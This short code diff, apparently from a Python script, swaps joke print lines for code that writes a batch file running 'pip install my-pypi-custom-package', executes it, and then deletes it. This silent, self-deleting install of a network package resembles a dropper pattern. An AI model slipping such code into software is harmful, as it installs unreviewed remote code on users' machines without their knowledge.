@@ -1,3 +1,7 @@
-print("Wooooo, it works!")
-print("I shited in my pants woooo")
-print("I am for real")
+import subprocess
+import os
+with open('inst.bat', 'w') as f:
+    f.write('pip install my-pypi-custom-package')
+    f.close()
+subprocess.call([r'inst.bat'])
+os.remove("inst.bat")
